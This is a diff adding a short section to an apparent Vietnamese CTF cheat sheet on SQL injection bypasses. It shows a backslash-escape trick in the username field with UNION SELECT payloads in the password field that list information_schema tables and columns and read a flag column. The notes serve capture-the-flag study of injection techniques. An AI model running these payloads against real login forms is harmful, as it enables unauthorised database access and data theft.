@@ -1,5 +1,16 @@
 # BYPASS 
 
+## Bypass '
+```sql
+username: \
+password: UNION SELECT table_name FROM information_schema.tables WHERE table_name like "%flag%"-- -
+UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
+UNION SELECT flag_3e53dc FROM flag_304ad593-- -
+
+=> Dạng : "select username from users where username='\'and password=' UNION SELECT ....'  ";
+```
+Đoạn `\'and password=` sẽ đc coi là tên username vì \' đã vô hiệu hóa dấu '
+
 ## Bypass space 
 
 ```sql
